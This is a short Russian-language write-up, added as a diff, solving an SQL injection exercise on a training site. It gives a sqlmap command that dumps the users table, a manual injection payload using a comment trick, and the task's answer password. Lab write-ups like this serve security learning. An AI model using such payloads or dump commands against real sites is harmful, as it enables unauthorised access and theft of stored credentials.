@@ -1,0 +1,20 @@
+https://sql.training.hackerdom.ru/3sdjjy.php
+--------------------------------------------
+
+Таблица: users
+Поля: id, login, pass
+Запрос: SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1
+Подсказка: сравнить с предыдущим примером, найти отличие
+
+
+Можно было конечно сделать эту таску через sqlmap (да и все в принципе)
+sqlmap -u "https://sql.training.hackerdom.ru/3sdjjy.php?text=j" --dbms=mysql -D sql_level3 -T users --dump
+
+и узнаем что ответ iwanttogo4
+
+но, вот другой способ
+
+1' or id=13 -- -
+-- - это как коментирование, и так же находим пароль
+
+ответ: iwanttogo4
